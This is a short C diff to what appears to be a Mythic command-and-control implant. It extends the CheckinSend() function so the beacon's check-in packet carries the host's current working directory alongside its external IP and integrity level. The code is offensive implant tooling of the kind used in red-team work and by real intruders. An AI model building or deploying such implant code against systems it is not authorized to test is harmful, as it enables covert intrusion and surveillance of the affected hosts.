@@ -176,6 +176,8 @@ BOOL CheckinSend()
         Size ExternIP
         Extern IP
         Integrity Level (BYTE: 0-4 Mythic integrity_level)
+        Size Cwd
+        Cwd
     */
 
     
@@ -249,6 +251,16 @@ BOOL CheckinSend()
 
     // Integrity level (Mythic: 1 low, 2 medium, 3 high, 4 SYSTEM; >2 = elevated UI)
     PackageAddByte(CheckinData, IdentityGetIntegrityLevel());
+
+    // Current working directory
+    CHAR Cwd[2048];
+    if (GetCurrentDirectoryA(sizeof(Cwd), Cwd) > 0)
+    {
+        PackageAddString(CheckinData, Cwd, TRUE);
+    } else
+    {
+        PackageAddString(CheckinData, "", TRUE);
+    }
 
     /* Free some allocations */
     LocalFree(tableOfIPs);
